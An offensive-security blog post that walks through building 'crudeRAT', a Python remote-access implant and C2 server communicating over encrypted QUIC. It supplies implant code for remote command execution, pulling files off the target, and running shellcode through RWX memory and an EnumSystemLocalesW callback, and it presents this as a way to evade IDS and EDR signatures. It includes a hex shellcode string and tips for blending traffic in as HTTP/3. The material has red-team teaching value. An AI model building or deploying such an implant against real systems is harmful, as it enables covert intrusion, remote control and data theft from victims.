---
title: Building an Encrypted C2 Implant Using QUIC
header:
  teaser: "/assets/images/quic.png"
categories:
  - Encrypted Shell
tags:
  - Initial Access
  - Python
  - Encryption
  - Encrypted reverse shell
  - C2
  - rat
  - implant
  - QUIC
  - '2026'
  - g3tsyst3m
---

Hey everyone! If you've been following the blog for a while, you'll likely recall my python driven C2 series.  Today we're doing something a little different. We're going to ditch TCP sockets entirely and build a C2 implant that communicates over **QUIC**.  QUIC is an encrypted transport protocol that runs over UDP. If you've never heard of QUIC, buckle up, because it's genuinely cool and increasingly relevant from an offensive security perspective. Let's get into it!

---

## ***What even is QUIC?***

QUIC (Quick UDP Internet Connections) was originally developed by Google and is now an IETF standard (RFC 9000). It's the transport layer underneath HTTP/3. Here's why it matters to us:

- **Encrypted by default**: TLS 1.3 is baked in. There's no plaintext QUIC. Every connection is encrypted from the first packet.
- **Runs over UDP**: Many network monitoring tools and IDS signatures are tuned heavily for TCP. QUIC gives us a different traffic profile. 😸
- **Multiplexed streams**: You get multiple independent streams over a single connection without head-of-line blocking.
- **Connection migration**: The connection can survive IP address changes. Very Handy.
- **ALPN negotiation**: Application Layer Protocol Negotiation lets you define your own protocol identifier. We're using `"g3tsyst3m"` as our ALPN string.  This means our traffic identifies itself as something custom rather than standard HTTP.

From a C2 perspective, `QUIC` gives you an encrypted, UDP-based channel that doesn't look like a typical reverse shell. That's a good starting point for researching an encrypted, reverse shell implant.

We'll be using the excellent `aioquic` and `tqdm` libraries, which gives us a full async QUIC implementation in Python + a cool progress bar for file uploads/downloads 😸. Install it with:

```
pip install aioquic tqdm
```

---

## ***Meet our crudeRAT*** 

I'm calling our implant **crudeRAT** because it's just a commandline driven, very rudimentary RAT type connector/implant 🐭

**Here's what it can do:**

- Encrypted reverse shell over QUIC (UDP/4433)
- Execution of commands just by typing them: `net user`, `whoami`, etc
- File upload to the implant (`send`) with tqdm progress bar
- File download from the implant (`recv`)
- Shellcode execution via `EnumSystemLocalesW` callback using hex
- Keep-alive PING to maintain the connection

Let's walk through the architecture before we get to the code.

---

## ***Architecture Overview***

```
[Attacker Linux Box (or Windows)]          [Windows Target]
  quicsvr3.py          ←→      quiccli3.py
  (C2 Server)        QUIC/UDP   (QuicRAT Implant)
  port 4433
```

The server runs on your attacker box. The implant runs on the target, connects back, and opens a bidirectional QUIC stream. All traffic is TLS 1.3 encrypted. The implant doesn't verify the server cert (since we're self-signed), but the encryption is still fully in place.

> Quick Wireshark Snapshot at the onset of the first connected client

<img width="1356" height="757" alt="image" src="https://github.com/user-attachments/assets/1e278909-c20f-4a04-9a9a-eca2a3b4fde9" />

> Server

<img width="855" height="321" alt="image" src="https://github.com/user-attachments/assets/eba5a3c7-6ad6-4073-9641-989470c38a77" />

> Client

<img width="1477" height="539" alt="image" src="https://github.com/user-attachments/assets/f5e2bc70-72c9-4023-8349-d3876f7b0006" />

---

**For the code samples I'll be using today, I plan to just pull from snippits of the full code I think are helpful to better understand.  I'll share the full source code at the end of the post!**

## ***The crudeRAT Implant (quiccli3.py)***

Let's start with the implant. The core class is `ImplantProtocol`, which extends `QuicConnectionProtocol`:

```python
class ImplantProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._upload_file    = None
        self._upload_path    = None
        self._upload_expect  = 0
        self._upload_recvd   = 0
        self._upload_sid     = None
        self._downloading    = False
```

The upload state variables are important.  When we're in the middle of receiving a file, raw binary data arrives across multiple `StreamDataReceived` events. We need to track how much we've received vs. how much we expect, and feed it all into an open file handle until we're done.

### Command Dispatch

Everything flows through `quic_event_received`. The first thing we do when data arrives is check whether we're mid-upload.  If so, we skip the command parser entirely and feed bytes straight to the file:

```python
if self._upload_file is not None:
    remaining = self._upload_expect - self._upload_recvd
    chunk = raw[:remaining]
    self._upload_file.write(chunk)
    self._upload_recvd += len(chunk)

    if self._upload_recvd >= self._upload_expect:
        self._upload_file.close()
        self._upload_file = None
        self._send(self._upload_sid, "File successfully uploaded!\n")
    return
```

Otherwise we decode the data as a UTF-8 command string and dispatch it:

```python
cmd = raw.decode('utf-8', errors='ignore').strip()
```

### File Upload Protocol

```bash
[C2] Command> send C:\Users\robbi\Documents\vtotal_hash.txt vtotal.txt
[C2] Sending 64 bytes...
Uploading vtotal.txt: 100%|█████████████████████████████████████████████████████████| 64.0/64.0 [00:00<00:00, 23.3kB/s]

[C2] File successfully uploaded!
```

The upload sequence is modeled after my original Python c2 series but adapted for `QUIC`.  Essentially, the server sends a framed header first, the implant acks ready, then raw binary flows:

```
server  → ":upload:|<filename>|<filesize>"
implant → "***Ready for upload***"
server  → raw binary (4096-byte chunks)
implant → "File successfully uploaded!"
```

We use `|` as the field separator instead of `:` because Windows paths contain colons (`C:\...`) and that caused all kinds of fun `ValueError` exceptions earlier in development 😄

Uploaded files land in `C:\users\public\uploads\` on the target by default.

### File Download Protocol

```bash
[C2] Command> recv C:\Users\robbi\Documents\vtotal_hash.txt c:\users\public\vtotal.txt
[C2] Receiving 64 bytes -> c:\users\public\vtotal.txt
[C2] Downloading vtotal.txt: 100%
[C2] Download complete: c:\users\public\vtotal.txt (64 bytes)

[+] File successfully downloaded! Saved to c:\users\public\vtotal.txt (64 bytes)
```

Downloading files is just as easy and we once again borrow from how I did this in the original Python c2 series.  We use the 'recv' command to initiate a download of a file(s):

```
server  → "~download~|<filepath>"
implant → "<filesize>" (plain int string)
implant → raw binary data (4096-byte chunks)
```

The implant sends the filesize first so the server knows when to stop reading. Then it just streams the file:

```python
filesize = os.path.getsize(filepath)
self._send(sid, str(filesize))
await asyncio.sleep(0.1)

with open(filepath, 'rb') as f:
    while True:
        chunk = f.read(4096)
        if not chunk:
            break
        self._send(sid, chunk)
        await asyncio.sleep(0)  # yield to event loop
```

### Executing Commands

Executing commands is incredibly straight forward.  Just pretend you are in a shell and type whatever command you like!  Here's a few I tested out:

```bat
[C2] Command> whoami

g3tsyst3m-pc\robbi

[C2] Command> net user

User accounts for \\G3TSYST3M-PC

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
robbi                    testuser                 WDAGUtilityAccount
WsiAccount
The command completed successfully.

You can use cd c:\ to go to the root directory, or even cd .. like so:

[C2] Command> cd c:\

Changed directory to c:\

[C2] Command> cd

c:\

You can also view the very basic help menu by typing `help`

[C2] Command> help

  <shell cmd>                    Run a shell command on the implant
  cd <path>                      Change implant working directory
  send <local> <remote>          Upload file to implant   (raw binary, tqdm progress)
  recv <remote> <local>          Download file from implant (raw binary)
  send_shellcode <hex>           Execute shellcode on the implant
  exit                           Shut down the C2

[C2] Command>
```

### Shellcode Execution

Alright, let's talk about the fun part 😸 For shellcode execution we use `EnumSystemLocalesW` as our callback trigger.  It's worth understanding *why* we pick this over the more obvious approaches.

The traditional approach to shellcode execution in Python is to call `VirtualAlloc`, copy your shellcode in, cast the address to a function pointer, and call it directly. That works, but it's also extremely well-signatured. EDRs have seen that pattern and then some lol. The callback technique is a way to have Windows call your shellcode *for you* through a legitimate API, which can look a lot cleaner from a behavioral analysis standpoint.

`EnumSystemLocalesW` is a Win32 API that enumerates all installed system locales on the machine. It takes a callback function pointer and calls it once per locale. From our perspective, we don't care about locales, we just need a API that accepts a function pointer and invokes it. There are many others in this family (`EnumWindows`, `EnumChildWindows`, `EnumThreadWindows`, `EnumDesktopWindows`...) and they all work on the same principle. 

**Here's the full execution flow:**

```python
# 1. Allocate RWX memory for the shellcode
addr = kernel32.VirtualAlloc(None, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

# 2. Copy shellcode bytes into the allocated region
buf = (ctypes.c_ubyte * sz).from_buffer_copy(shellcode_bytes)
kernel32.RtlMoveMemory(c_void_p(addr), buf, sz)

# 3. Pass the shellcode address as the callback — Windows calls it for us
kernel32.EnumSystemLocalesW(c_void_p(addr), 0)
```

We use `RtlMoveMemory` instead of `ctypes.memmove` for the copy.  It really doesn't matter, it's just my personal preference.  😈

Now, the async wrinkle. Our encrypted c2 implant, or crudeRAT if you will, runs entirely inside an `asyncio` event loop. If we call `EnumSystemLocalesW` directly on the event loop thread and our shellcode blocks, then we would freeze the entire implant. No more commands, no keep-alive pings, nothing. So, we push shellcode execution into a thread pool via `run_in_executor`:

```python
loop = asyncio.get_event_loop()
success = await asyncio.wait_for(
    loop.run_in_executor(None, call_enum),
    timeout=10.0
)
```

The `wait_for` gives us a 10-second timeout. If the shellcode hasn't returned by then we bail, free the memory, and report back. In practice, a working beacon payload will do its thing and the implant just continues running on the event loop thread independently. The shellcode spins up its own threads internally.  I'm more or less imitating an actual beacon payload...in a much more crude way lol.

One thing worth noting for defenders reading this: `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` followed by `EnumSystemLocalesW` is a detectable sequence. A well-tuned EDR with kernel callbacks watching `NtAllocateVirtualMemory` and `NtProtectVirtualMemory` will light up on this. The improvement path from here is module stomping or reflective loading into already-executable memory.  Topics I'd love to dive into further in a future post (or a Learning Course Module, something I'm working on off and on in what spare time I have).😄

### Using Shellcode from the C2 Client

```python
[C2] Command> send_shellcode <hex-encoded shellcode>
[IMPLANT] Shellcode executed successfully

For instance, the following will execute calc.exe using the `EnumSystemLocalesW` API:

[C2] Command> send_shellcode 4883ec284883e4f04831c965488b4160488b4018488b7010488b36488b36488b5e304989d88b5b3c4c01c34831c96681c1ff8848c1e9088b140b4c01c2448b52144d31db448b5a204d01c34c89d148b8646472657373909048c1e01048c1e8105048b847657450726f6341504889e067e32031db418b1c8b4c01c348ffc94c8b084c390b75e9448b480844394b08740375ddcc51415f49ffc74d31db448b5a1c4d01c3438b04bb4c01c050415f4d89fc4c89c74c89c14d89e64889f9b861649090c1e010c1e8105048b84578697454687265504889e24883ec3041ffd64883c4304989c54d89e64889f948b857696e4578656300504889e24883ec3041ffd64883c4304989c64883c408b8000000005048b863616c632e657865504889e1ba010000004883ec3041ffd631c941ffd5
```

Generate your shellcode hex with whatever framework you prefer and paste it in. The implant handles the rest.

### Keep-Alive

QUIC connections have an idle timeout — without traffic, the connection drops. We solve this with a background coroutine that sends a QUIC PING frame every 20 seconds:

```python
async def keep_alive(protocol):
    while True:
        await asyncio.sleep(20)
        protocol._quic.send_ping(uid=0)
        protocol.transmit()
```

Simple and effective.

---

## ***The C2 Server (quicsvr3.py)***

The server uses `aioquic`'s `serve()` function and handles the same bidirectional stream from the other side.

### TLS Setup

QUIC requires a certificate. Generate a self-signed one before running the server:

```
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=localhost'
```

The server loads it like this:

```python
config = QuicConfiguration(is_client=False, alpn_protocols=["g3tsyst3m])
config.load_cert_chain("cert.pem", "key.pem")
config.max_idle_timeout = 600000  # 10 minutes
```

The implant sets `verify_mode = ssl.CERT_NONE` since it's self-signed, but the TLS encryption itself is fully active.

### Download State Machine

This is the trickiest part of the server. On TCP you can just `recv(filesize)` in a loop. On QUIC, data arrives in `StreamDataReceived` events of arbitrary size. We use a state machine with three states:

```python
_DL_IDLE      = "idle"
_DL_WAIT_SIZE = "wait_size"   # waiting for filesize int from implant
_DL_RECV_DATA = "recv_data"   # receiving raw binary
```

When a download starts we flip to `_DL_WAIT_SIZE`. The first data that arrives is buffered until we can parse the filesize integer. Then we flip to `_DL_RECV_DATA` and feed everything into an open file handle until `received >= filesize`:

```python
def _write_dl_chunk(self, data: bytes):
    remaining = self._dl_filesize - self._dl_received
    chunk     = data[:remaining]
    self._dl_file.write(chunk)
    self._dl_received += len(chunk)

    if self._dl_received >= self._dl_filesize:
        self._dl_file.close()
        self.output_buffer = f"DOWNLOAD_DONE|{self._dl_save_path}|{self._dl_received}"
        self._dl_reset()
```

### Upload stuff

Uploading files is satisfying because you get a proper progress bar 😸

```python
with open(local_path, 'rb') as f, tqdm(total=filesize, unit="B", unit_scale=True,
                                        desc=f"Uploading {filename}") as pbar:
    for chunk in iter(lambda: f.read(4096), b''):
        client.send_raw(chunk)
        pbar.update(len(chunk))
        await asyncio.sleep(0)
```

The `await asyncio.sleep(0)` on each chunk yields back to the event loop so QUIC can actually flush the data. Without that yield you'd buffer the whole file before any of it goes out.

---

## ***Putting It All Together***

<iframe width="560" height="315" src="https://www.youtube.com/embed/5qOXDnNApRg" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---

## ***Improvements / Things to Keep in Mind***

- **No persistence**: The implant doesn't install itself anywhere. You'd need to add that separately.
- **Shell output timing**: The `await asyncio.sleep(0.5)` in the shell loop is a timing assumption. Long-running commands may need a longer sleep or a sentinel string like `:endofoutput:` (like we did in Part 2) for reliable output capture.
- **Single implant**: The server only tracks one connected client at a time via `current_client`. Multi-implant support would need a proper client list like I do in my first python series.  This is more to demonstrate how to create an encrypted reverse shell / C2 implant.
- **ALPN string** — `"g3tsyst3m"` is fine for a lab, but in a real pentest engagement your ALPN should blend in. `"h3"` (HTTP/3) would be far less conspicuous.

---

## ***Wrapping Up***

We covered a lot of ground today! QUIC gives us an encrypted, UDP-based connection with added stealth not always afforded for your standard c2 / reverse shell connection.  It's also not commonly used for this purpose so we won't be as heavily signatured.

Source code: [Python Server/Client Source Code](https://github.com/g3tsyst3m/CodefromBlog/tree/main/2026-4-30-Building%20an%20Encrypted%20C2%20Implant%20Using%20QUIC)

Stay tuned for the next post.  I'm likely going to visit Just in Time Shellcode execution next, so see you then!🦉

***Bonus Content for Members! (All Membership Tiers)***
-

🐍 Standalone Python Script that executes Calc.exe using EnumSystemLocalesW: [EnumSystemLocalesW w/ Python Standalone](https://ko-fi.com/s/a8ca3672b0)

<img width="1584" height="858" alt="image" src="https://github.com/user-attachments/assets/1296221c-9f09-4df0-8914-e3d94d5b136e" />

---

<div style="text-align: right;">
Sponsored by:<br>
<img src="https://github.com/user-attachments/assets/111a0bb6-66e1-43b0-9a0a-5ce093f4b65e" alt="Sponsor logo" style="max-width: 200px;">
</div>
